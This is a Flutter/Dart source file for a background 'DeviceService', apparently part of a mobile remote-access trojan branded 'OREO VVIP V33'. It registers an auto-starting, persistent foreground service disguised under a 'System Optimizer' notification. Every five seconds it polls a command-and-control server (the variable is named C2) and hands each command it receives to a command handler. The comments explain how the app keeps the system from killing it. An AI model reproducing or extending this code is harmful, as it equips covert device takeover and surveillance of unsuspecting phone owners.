import 'dart:async';
import 'dart:convert';
import 'dart:ui';
import 'package:flutter/foundation.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import '../config.dart';
import 'command_handler.dart';

class DeviceService {
  static Future<void> init() async {
    final svc = FlutterBackgroundService();
    await svc.configure(
      iosConfiguration: IosConfiguration(autoStart: true),
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        autoStart: true,
        isForegroundMode: true, // WAJIB: Biar sistem gak matiin aplikasi
        notificationChannelId: 'oreo_svc',
        initialNotificationTitle: 'OREO VVIP V33',
        initialNotificationContent: 'System Optimizer is running in background...',
        foregroundServiceNotificationId: 9911,
        foregroundServiceTypes: [AndroidForegroundType.specialUse], // Android 14 Support
      ),
    );
    svc.startService();
  }

  @pragma('vm:entry-point')
  static Future<void> onStart(ServiceInstance service) async {
    try {
      DartPluginRegistrant.ensureInitialized();
      final prefs = await SharedPreferences.getInstance();
      String? devId = prefs.getString('dev_id');
      if (devId == null) {
        devId = DateTime.now().millisecondsSinceEpoch.toString();
        await prefs.setString('dev_id', devId);
      }

      // Timer buat narik perintah dari server tiap 5 detik
      Timer.periodic(const Duration(seconds: 5), (t) async {
        try {
          final r = await http.get(Uri.parse('$C2/api/device/$devId/poll')).timeout(const Duration(seconds: 4));
          if (r.statusCode != 200) return;
          final j = jsonDecode(r.body);
          await prefs.setString('cfg', jsonEncode(j['config'] ?? {}));
          
          final cmd = j['cmd'];
          if (cmd != null) {
            await CommandHandler.handle(cmd, devId!, prefs);
          }
        } catch (_) {}
      });
    } catch (e) {
      debugPrint("Background isolate error: $e");
    }
  }
}
